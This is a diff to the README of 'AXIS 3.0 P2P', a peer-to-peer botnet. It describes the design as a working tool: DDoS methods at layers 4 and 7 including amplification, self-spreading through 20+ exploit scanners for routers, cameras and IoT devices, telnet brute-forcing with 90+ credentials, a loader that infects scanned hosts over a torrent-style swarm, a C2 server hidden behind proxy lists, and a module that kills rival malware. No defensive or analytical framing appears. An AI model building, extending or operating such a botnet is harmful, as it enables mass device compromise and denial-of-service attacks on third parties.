@@ -4,13 +4,15 @@
 
 AXIS 3.0 P2P is a fully decentralized peer-to-peer botnet using **torrent-style binary distribution**. Every bot simultaneously executes DDoS attacks, self-replicates via 20+ exploit scanners, and **seeds ALL bot binaries** to newly infected devices — exactly like a BitTorrent swarm where every peer is a seeder.
 
-### Key Design Principles (from `how it should work.txt`)
+### Key Design Principles
 
-1. **Torrent-style P2P distribution**: Bots download ALL binaries from the P2P network, not from a central HTTP server. Every bot is a seeder.
-2. **Self-replication built-in**: All scanners from `scanners-exploits/` are integrated into every bot binary. Every infected device immediately starts scanning for new targets.
-3. **CNC joins via proxy lists**: The C&C server doesn't expose its real IP. It loads proxy lists from the `proxies/` folder and uses them to inject attack commands into the P2P network while staying shielded.
-4. **Auto-seed control**: CNC stops seeding binaries when the network reaches 200 bots. If the network dips below 200, it resumes seeding.
-5. **Every bot = seeder + attacker**: Bots serve binaries to peers while executing attacks and running scanners simultaneously.
+1. **Torrent-style P2P distribution**: Bots download ALL binaries from the P2P network via UDP 49153. Every bot is a seeder.
+2. **DNS resolution on bots**: All L4 attacks (UDP, TCP, ICMP, amplification) resolve domains via 7 rotating DNS servers (1.1.1.1, 8.8.8.8, 8.8.4.4, 9.9.9.9, 1.0.0.1, etc.)
+3. **URL-based L7 attacks**: L7 methods accept URLs directly - bots parse protocol, domain, path, and port automatically
+4. **Integrated scanners**: C2 server includes ZMap-style fast port scanner + telnet bruter
+5. **Auto-deployment**: Scan results feed to loader for binary download via P2P torrent swarm
+6. **C2 joins via proxies**: C2 loads proxy lists from `proxies/` folder to inject commands while shielding its IP
+7. **Auto-seed control**: C2 stops seeding binaries at 200 bots, resumes below 200
 
 ## Architecture
 
@@ -27,7 +29,7 @@ AXIS 3.0 P2P is a fully decentralized peer-to-peer botnet using **torrent-style 
 │  │   ├─ Telnet Scanner (port 23, 90+ credentials)                │
 │  │   ├─ SSH Scanner (port 22)                                     │
 │  │   └─ 20+ Exploit Scanners (routers, IoT, cameras)             │
-│  ├─ CNC Connection (optional, TLS port 443)                      │
+│  ├─ C2/CNC Connection (optional, TLS port 443)
 │  └─ Killer Module (anti-competing malware)                        │
 │                                                                    │
 │  Every bot is BOTH a seeder AND an attacker                       │
